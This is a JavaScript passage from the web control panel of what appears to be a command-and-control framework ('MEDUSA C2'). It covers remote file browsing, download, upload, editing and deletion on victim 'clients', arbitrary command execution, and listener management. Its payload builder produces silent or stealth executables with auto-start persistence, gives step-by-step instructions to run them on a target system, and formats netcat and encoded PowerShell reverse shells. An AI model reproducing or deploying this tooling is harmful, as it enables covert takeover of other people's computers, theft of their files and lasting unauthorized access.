                const freeSpace = parts[1] ? formatBytes(parseInt(parts[1])) : 'Unknown';
                const totalSize = parts[2] ? formatBytes(parseInt(parts[2])) : 'Unknown';
                
                if (caption && caption.includes(':')) {
                    createDriveElement(caption, freeSpace, totalSize, explorer);
                }
            }
        });
    }
}

// Helper function to create drive elements consistently
function createDriveElement(driveId, freeSpace, totalSize, explorer) {
    const driveDiv = $('<div>').addClass('file-item p-3 border-bottom').css('cursor', 'pointer');
    driveDiv.on('click', function() {
        // Ensure consistent drive path format
        const drivePath = driveId.endsWith(':') ? driveId + '\\\\' : driveId;
        browsePath(drivePath);
    });
    
    const driveContent = $('<div class="d-flex align-items-center">').append(
        $('<i class="fas fa-hdd text-primary me-3" style="font-size: 24px;"></i>'),
        $('<div>').append(
            $('<h6 class="mb-1">').text(driveId + ' Drive'),
            $('<small class="text-muted">').text('Free: ' + freeSpace + ' | Total: ' + totalSize)
        )
    );
    
    driveDiv.append(driveContent);
    explorer.append(driveDiv);
}

// Display directory listing
function displayDirectoryListing(output, path) {
    const explorer = $('#file-explorer');
    explorer.empty();
    
    // Add parent directory link if not at root
    if (path !== 'C:\\' && path !== 'D:\\' && path !== 'E:\\' && path !== 'F:\\' && !path.match(/^[A-Z]:\\$/)) {
        // Fix parent path calculation - handle trailing backslashes properly
        let cleanPath = path.replace(/\\+$/, ''); // Remove trailing backslashes
        let parentPath;
        
        if (cleanPath.includes('\\')) {
            // Split and rejoin without last directory
            const pathParts = cleanPath.split('\\');
            pathParts.pop(); // Remove last directory
            parentPath = pathParts.join('\\');
            
            // Ensure drive root has trailing backslash
            if (parentPath.match(/^[A-Z]:$/)) {
                parentPath += '\\';
            } else if (parentPath && !parentPath.endsWith('\\')) {
                parentPath += '\\';
            }
        } else {
            // If no backslash, we're probably at drive root
            parentPath = 'Drives'; // Go back to drives list
        }
        
        console.log('Current path:', path, 'Parent path:', parentPath);
        
        const parentDiv = $('<div class="file-item p-2 border-bottom">').css('cursor', 'pointer');
        parentDiv.on('click', function() {
            if (parentPath === 'Drives') {
                listAllDrives();
            } else {
                browsePath(parentPath);
            }
        });
        parentDiv.html('<i class="fas fa-level-up-alt text-info me-2"></i><span>.. (Parent Directory)</span>');
        explorer.append(parentDiv);
    }
    
    const files = output.split('\n').filter(line => line.trim());
    
    files.forEach(fileName => {
        fileName = fileName.trim();
        if (fileName && fileName !== '.' && fileName !== '..') {
            // Determine if it's a directory based on extension or if it ends with a backslash
            const isDirectory = !fileName.includes('.') || fileName.endsWith('.lnk') || fileName.endsWith('\\');
            const icon = isDirectory ? 'fas fa-folder text-warning' : 'fas fa-file text-light';
            
            const fileDiv = $('<div class="file-item p-2 border-bottom">').css('cursor', 'pointer');
            
            if (isDirectory) {
                fileDiv.on('click', function() {
                    // Ensure proper path concatenation for directories
                    let newPath;
                    if (path.endsWith('\\')) {
                        newPath = path + fileName;
                    } else {
                        newPath = path + '\\' + fileName;
                    }
                    
                    // Add trailing backslash for directories
                    if (!newPath.endsWith('\\')) {
                        newPath += '\\';
                    }
                    
                    browsePath(newPath);
                });
            } else {
                fileDiv.on('click', function() {
                    console.log('File clicked:', fileName);
                    selectFile(fileName, false);
                });
            }
            
            fileDiv.html('<i class="' + icon + ' me-2"></i><span>' + fileName + '</span>');
            
            // Add visual indicator for file vs directory
            if (!isDirectory) {
                fileDiv.attr('title', 'Click to select file for download/edit');
                fileDiv.css('border-left', '3px solid var(--dracula-green)');
            } else {
                fileDiv.attr('title', 'Click to open directory');
                fileDiv.css('border-left', '3px solid var(--dracula-purple)');
            }
            
            explorer.append(fileDiv);
        }
    });
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function selectFile(fileName, isDirectory) {
    console.log('Selecting file:', fileName, 'isDirectory:', isDirectory);
    selectedFile = fileName;
    $('.file-item').removeClass('selected');
    
    // Better file selection logic - look for exact match
    $('.file-item').each(function() {
        const itemText = $(this).find('span').last().text().trim();
        if (itemText === fileName) {
            $(this).addClass('selected').css('background-color', 'rgba(189, 147, 249, 0.4)');
            console.log('Selected file item:', itemText);
        }
    });
    
    // Show notification of selection
    showNotification('📁 File Selected', `Selected: ${fileName}`, 'success');
    
    // Update the current path display to show selected file
    $('#current-path').html(`${currentPath} <span style="color: var(--dracula-pink); font-weight: bold;">[${fileName}]</span>`);
}

function refreshFiles() {
    if (currentPath === 'Drives') {
        listAllDrives();
    } else {
        browsePath(currentPath);
    }
}

function downloadFile() {
    if (!selectedFile || !selectedFileClientId) {
        showNotification('❌ Error', 'Please select a file first', 'error');
        return;
    }
    
    // Construct the full file path correctly
    let filePath = currentPath;
    if (!currentPath.endsWith('\\')) {
        filePath += '\\';
    }
    filePath += selectedFile;
    
    console.log('Download request for:', filePath, 'from client:', selectedFileClientId);
    
    // Show loading notification
    showNotification('📎 Download Started', `Downloading: ${selectedFile}`, 'success');
    
    socket.emit('download_file', {
        client_id: selectedFileClientId,
        file_path: filePath
    });
}

function editFile() {
    if (!selectedFile || !selectedFileClientId) {
        showNotification('❌ Error', 'Please select a file first', 'error');
        return;
    }
    
    // Construct the full file path correctly
    let filePath = currentPath;
    if (!currentPath.endsWith('\\')) {
        filePath += '\\';
    }
    filePath += selectedFile;
    
    socket.emit('get_file_content', {
        client_id: selectedFileClientId,
        file_path: filePath
    });
}

function deleteFile() {
    if (!selectedFile || !selectedFileClientId) {
        showNotification('❌ Error', 'Please select a file first', 'error');
        return;
    }
    
    if (!confirm('Are you sure you want to delete ' + selectedFile + '?')) return;
    
    // Construct the full file path correctly
    let filePath = currentPath;
    if (!currentPath.endsWith('\\')) {
        filePath += '\\';
    }
    filePath += selectedFile;
    
    socket.emit('execute_command', {
        client_id: selectedFileClientId,
        command: 'del "' + filePath + '"'
    });
    
    // Clear selection and refresh after a delay
    selectedFile = null;
    setTimeout(() => refreshFiles(), 1500);
}

function showUploadModal() {
    if (!selectedFileClientId) {
        showNotification('❌ Error', 'Please select a client first', 'error');
        return;
    }
    $('#upload-path').val(currentPath);
    $('#uploadModal').modal('show');
}

function uploadFile() {
    const file = document.getElementById('upload-file').files[0];
    const path = $('#upload-path').val();
    
    if (!file || !path) {
        showNotification('❌ Error', 'Please select a file and specify upload path', 'error');
        return;
    }
    
    // Show loading notification
    showNotification('📎 Upload Started', `Uploading: ${file.name}`, 'success');
    
    const reader = new FileReader();
    reader.onload = function(e) {
        // Extract base64 data (remove data URL prefix)
        let fileData = e.target.result;
        if (fileData.startsWith('data:')) {
            fileData = fileData.split(',')[1];
        }
        
        socket.emit('upload_file', {
            client_id: selectedFileClientId,
            file_name: file.name,
            file_data: fileData,
            upload_path: path
        });
    };
    reader.readAsDataURL(file);
    
    $('#uploadModal').modal('hide');
}

function createFolder() {
    if (!selectedFileClientId) {
        showNotification('❌ Error', 'Please select a client first', 'error');
        return;
    }
    
    const folderName = prompt('Enter folder name:');
    if (!folderName) return;
    
    // Construct the full folder path correctly
    let folderPath = currentPath;
    if (!currentPath.endsWith('\\')) {
        folderPath += '\\';
    }
    folderPath += folderName;
    
    socket.emit('execute_command', {
        client_id: selectedFileClientId,
        command: 'mkdir "' + folderPath + '"'
    });
    
    // Add a small delay before refreshing to allow the folder to be created
    setTimeout(() => refreshFiles(), 1500);
}

function saveFile() {
    if (!selectedFile || !selectedFileClientId) {
        showNotification('❌ Error', 'No file selected', 'error');
        return;
    }
    
    const content = $('#file-content').val();
    
    // Construct the full file path correctly
    let filePath = currentPath;
    if (!currentPath.endsWith('\\')) {
        filePath += '\\';
    }
    filePath += selectedFile;
    
    socket.emit('save_file', {
        client_id: selectedFileClientId,
        file_path: filePath,
        content: content
    });
    
    $('#editModal').modal('hide');
    showNotification('✅ Success', 'File saved successfully', 'success');
}

// Enhanced Payload Builder Functions
function generatePayload() {
    const type = $('#payload-type').val();
    const ip = $('#server-ip').val();
    const port = $('#server-port').val();
    const payloadMode = $('#payload-mode').val();
    const addPersistence = $('#add-persistence').is(':checked');
    let exeName = $('#exe-name').val() || 'client';
    
    // Strip .exe extension if user entered it
    if (exeName.toLowerCase().endsWith('.exe')) {
        exeName = exeName.slice(0, -4);
    }
    
    if (!ip || !port) {
        showNotification('❌ Error', 'Please enter server IP and port', 'error');
        return;
    }
    
    // Show loading
    $('#payload-output').text('Generating payload...');
    $('#copy-btn').prop('disabled', true);
    
    // Send generation request to server
    socket.emit('generate_payload', {
        type: type,
        ip: ip,
        port: parseInt(port),
        output: exeName,
        payload_mode: payloadMode,
        persistence: addPersistence,
        build_exe: type === 'python'
    });
}

// Handle payload generation response
socket.on('payload_generated', function(data) {
    if (data.success) {
        let output = '';
        
        switch(data.type) {
            case 'python':
                let modeText = '';
                if (data.mode === 'silent') {
                    modeText = ' (Silent Stealth Mode)';
                } else if (data.mode === 'stealth') {
                    modeText = ' (Advanced Stealth Mode)';
                } else if (data.mode === 'basic') {
                    modeText = ' (Basic Mode)';
                }
                
                output = '# MEDUSA C2 Payload Generated' + modeText + '\n\n';
                output += '🚀 Build Status: SUCCESS\n';
                output += '📅 Generated: ' + new Date().toLocaleString() + '\n\n';
                
                if (data.result.python_file) {
                    output += '📄 Python source: ' + data.result.python_file.replace(/\\/g, '/') + '\n';
                }
                if (data.result.exe_file) {
                    output += '🚀 Executable: ' + data.result.exe_file.replace(/\\/g, '/') + '\n';
                    
                    if (data.mode === 'silent' || data.mode === 'stealth') {
                        output += '\n✅ Silent EXE generated successfully!\n';
                        output += '🔇 Runs completely silently (no console window)\n';
                        if (data.mode === 'stealth') {
                            output += '🔒 Enhanced stealth features enabled\n';
                            output += '⚙️ Background priority management active\n';
                        }
                    } else {
                        output += '\n✅ Standard EXE generated successfully!\n';
                        output += '💻 Runs with normal console behavior\n';
                    }
                } else if (data.result.python_file) {
                    output += '\n⚠️  Python source only (EXE build failed)\n';
                }
                
                if (data.persistence) {
                    output += '🔄 Persistence enabled (auto-start)\n';
                }
                
                output += '\n📁 Files saved to nova/payloads/ directory\n';
                output += '📂 Build logs available in console\n';
                output += '🔗 Ready for deployment!\n\n';
                
                // Add deployment instructions
                output += '📋 Deployment Instructions:\n';
                output += '1. Copy the executable to target system\n';
                output += '2. Ensure C2 server is listening on specified port\n';
                output += '3. Execute the payload on target\n';
                output += '4. Monitor connections in Clients section\n';
                
                // Add option to open folder
                setTimeout(() => {
                    if (confirm('✅ Payload generated successfully!\n\nWould you like to open the payloads folder?')) {
                        // Send command to open folder
                        if (selectedClientId) {
                            socket.emit('execute_command', {
                                client_id: selectedClientId,
                                command: 'explorer "' + data.result.exe_file.replace(/\\/g, '\\').split('\\').slice(0, -1).join('\\') + '"'
                            });
                        }
                    }
                }, 500);
                
                break;
                
            case 'netcat':
                output = buildNetcatOutput(data.result.commands);
                break;
                
            case 'powershell':
                output = buildPowershellOutput(data.result.script);
                break;
        }
        
        $('#payload-output').text(output.replace(/\\n/g, '\n'));
        $('#copy-btn').prop('disabled', false);
        showNotification('🔨 Payload Generated', 'Payload generation completed successfully', 'success');
        logActivity('Payload Generated', `Type: ${data.type}, IP: ${data.ip}:${data.port}`, 'success');
    } else {
        $('#payload-output').text('❌ Error: ' + data.error + '\n\nPlease check:\n- PyInstaller is installed: pip install pyinstaller\n- Python is in PATH\n- Sufficient disk space available\n- Antivirus is not blocking the build process');
        showNotification('❌ Generation Failed', data.error, 'error');
        logActivity('Payload Generation Failed', data.error, 'error');
    }
});

function buildNetcatOutput(commands) {
    let output = '🐚 Netcat Reverse Shell Commands\n\n';
    output += '🪟 Windows:\n';
    commands.windows.forEach(cmd => {
        output += '   ' + cmd + '\n';
    });
    output += '\n🐧 Linux/Mac:\n';
    commands.linux.forEach(cmd => {
        output += '   ' + cmd + '\n';
    });
    output += '\n👂 Listener (run on server):\n';
    commands.listener.forEach(cmd => {
        output += '   ' + cmd + '\n';
    });
    return output;
}

function buildPowershellOutput(script) {
    let output = '⚡ PowerShell Reverse Shell\n\n';
    output += '📝 Full Script:\n';
    output += script.script + '\n\n';
    output += '🚀 One-liner:\n';
    output += script.oneliner + '\n\n';
    if (script.encoded) {
        output += '🔒 Encoded version:\n';
        output += script.encoded;
    }
    return output;
}

function copyToClipboard() {
    const output = $('#payload-output').text();
    navigator.clipboard.writeText(output).then(() => {
        showNotification('✅ Copied', 'Payload copied to clipboard', 'success');
    }).catch(() => {
        showNotification('❌ Error', 'Failed to copy to clipboard', 'error');
    });
}

// Listener Management Functions
function loadListeners() {
    fetch('/api/listeners')
        .then(response => response.json())
        .then(data => {
            updateListenersTable(data);
        })
        .catch(error => {
            console.error('Error loading listeners:', error);
            showNotification('❌ Error', 'Failed to load listeners', 'error');
        });
}

function updateListenersTable(listeners) {
    const listenersList = $('#listeners-list');
    listenersList.empty();
    
    listeners.forEach(listener => {
        const statusBadge = listener.running ? 
            '<span class="badge bg-success">Running</span>' :
            '<span class="badge bg-danger">Stopped</span>';
        
        const actionButton = listener.running ?
            `<button class="btn btn-sm btn-danger" onclick="stopListener('${listener.name}')">
                <i class="fas fa-stop"></i> Stop
            </button>` :
            `<button class="btn btn-sm btn-success" onclick="startListener('${listener.name}')">
                <i class="fas fa-play"></i> Start
            </button>`;
        
        const listenerRow = `
            <tr>
                <td>${listener.name}</td>
                <td>${listener.host}</td>
                <td>${listener.port}</td>
                <td>${statusBadge}</td>
                <td>${listener.clients_connected || 0}</td>
                <td>
                    ${actionButton}
                    <button class="btn btn-sm btn-warning ms-1" onclick="deleteListener('${listener.name}')">
                        <i class="fas fa-trash"></i> Delete
                    </button>
                </td>
            </tr>
        `;
        listenersList.append(listenerRow);
    });
}

function showCreateListenerModal() {
    $('#createListenerModal').modal('show');
}

function createListener() {
    const name = $('#listener-name').val().trim();
    const host = $('#listener-host').val().trim();
    const port = parseInt($('#listener-port').val());
    
    if (!name || !host || !port) {
        showNotification('❌ Error', 'Please fill in all fields', 'error');
        return;
    }
    
    console.log('Creating listener:', name, host, port);
    
    if (!socket || !socketConnected) {
        // Fallback to HTTP API if socket not available
        fetch('/api/listeners', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                name: name,
                host: host,
                port: port
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                showNotification('✅ Listener Created', `Listener '${name}' created on ${host}:${port}`, 'success');
                loadListeners();
                $('#createListenerModal').modal('hide');
                
                // Clear form
                $('#listener-name').val('');
                $('#listener-host').val('0.0.0.0');
                $('#listener-port').val('');
            } else {
                showNotification('❌ Error', data.error || 'Failed to create listener', 'error');
            }
        })
        .catch(error => {
            console.error('Error creating listener:', error);
            showNotification('❌ Error', 'Failed to create listener', 'error');
        });
    } else {
        socket.emit('create_listener', {
            name: name,
            host: host,
            port: port
        });
        
        $('#createListenerModal').modal('hide');
        
        // Clear form
        $('#listener-name').val('');
        $('#listener-host').val('0.0.0.0');
        $('#listener-port').val('');
    }
}

function startListener(name) {
    console.log('Starting listener:', name);
    if (!socket || !socketConnected) {
        // Fallback to HTTP API if socket not available
        fetch(`/api/listeners/${name}/start`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                showNotification('▶️ Listener Started', `Listener '${name}' is now running`, 'success');
                loadListeners();
            } else {
                showNotification('❌ Error', data.error || 'Failed to start listener', 'error');
            }
        })
        .catch(error => {
            console.error('Error starting listener:', error);
            showNotification('❌ Error', 'Failed to start listener', 'error');
        });
    } else {
        socket.emit('start_listener', { name: name });
    }
}

function stopListener(name) {
    console.log('Stopping listener:', name);
    if (!socket || !socketConnected) {
        // Fallback to HTTP API if socket not available
        fetch(`/api/listeners/${name}/stop`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                showNotification('⏹️ Listener Stopped', `Listener '${name}' has been stopped`, 'warning');
                loadListeners();
            } else {
                showNotification('❌ Error', data.error || 'Failed to stop listener', 'error');
            }
        })
        .catch(error => {
            console.error('Error stopping listener:', error);
            showNotification('❌ Error', 'Failed to stop listener', 'error');
        });
    } else {
        socket.emit('stop_listener', { name: name });
    }
}

function deleteListener(name) {
    if (!confirm(`Are you sure you want to delete listener '${name}'?`)) {
        return;
    }
    
    console.log('Deleting listener:', name);
    if (!socket || !socketConnected) {
        // Fallback to HTTP API if socket not available
        fetch(`/api/listeners/${name}`, {
            method: 'DELETE',
            headers: {
                'Content-Type': 'application/json'
            }
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                showNotification('🗑️ Listener Deleted', `Listener '${name}' has been deleted`, 'info');
                loadListeners();
            } else {
                showNotification('❌ Error', data.error || 'Failed to delete listener', 'error');
            }
        })
        .catch(error => {
            console.error('Error deleting listener:', error);
            showNotification('❌ Error', 'Failed to delete listener', 'error');
        });
    } else {
        socket.emit('delete_listener', { name: name });
    }
}